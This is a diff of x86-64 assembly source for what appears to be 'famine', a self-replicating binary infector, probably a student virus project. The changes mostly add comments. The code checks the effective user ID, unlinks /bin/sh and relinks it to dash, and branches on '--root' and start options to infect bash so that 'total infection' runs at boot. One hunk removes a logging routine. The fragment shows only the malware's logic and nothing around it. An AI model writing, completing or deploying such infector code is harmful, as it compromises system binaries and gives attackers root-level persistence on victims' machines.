@@ -23,7 +23,7 @@ _bin_bash:
 _symlink:
     .string db '/bin/sh', 0
 
-_start_infect: ; (rdi: env addr)
+_start_infect: ; here we know we will infect only bash, and redirect sh to bash
     enter 24, 0
 	mov rax, 107
 	syscall ; We call geteuid
@@ -50,7 +50,7 @@ _ret:
     leave
     ret
 
-_relink_sh:
+_relink_sh: ; unlink sh, and link it to dash
     mov rax, 87
     lea rdi, [rel _symlink]
     syscall
@@ -59,9 +59,6 @@ _relink_sh:
     lea rdi, [rel _bin_dash]
     syscall
     jmp _verify_o_entry
-
-_log_file:
-    .name db '/ptdr', 0
 
 _starting_str:
     .name db '/bin/sh', 0
@@ -107,20 +104,6 @@ _verify_starting_infect:
 _infect_from_root:
 ;    enter 16, 0
     push rdi
-    mov rax, 2
-    lea rdi, [rel _log_file.name]
-    mov rsi, 2
-    syscall
-    push rax
-    mov rax, 1
-    mov rdi, QWORD [rsp]
-    lea rsi, [rel _starting_str.order]
-    mov rdx, 5
-    syscall
-    mov rax, 3
-    mov rdi, QWORD [rsp]
-    syscall
-    pop rax
     mov rax, 0
     push rax
     mov rax, 1
@@ -239,23 +222,24 @@ _activate_root_infection:
     .string db '--root', 0
     .len equ $ - _activate_root_infection.string
 
-_famine_start_options:
+_famine_start_options: ; dispatch according to arguments. famine binary only !!
     mov rax, QWORD [rsp + 128]
     cmp rax, 2
-    jne _continue_normaly
+    jne _continue_normaly ; if their is only 2 args, we just infect normally
 
 _test_options:
+;   here we check the differents values, and redirect according to it
     mov rdi, QWORD [rsp + 144]
     mov rcx, _activate_start_infection.len
     lea rsi, [rel _activate_start_infection.string]
     cld
     repe cmpsb
-    je _start_infect
+    je _start_infect ; infect bash, to run total infection at boot time
     mov rdi, QWORD [rsp + 144]
     mov rcx, _activate_root_infection.len
     lea rsi, [rel _activate_root_infection.string]
     cld
     repe cmpsb
     lea rdi, [rel _exit_properly]
-    je _infect_from_root
-    jmp _continue_normaly
+    je _infect_from_root ; infect from root
+    jmp _continue_normaly ; no arguments corresponds, so simply run normally.
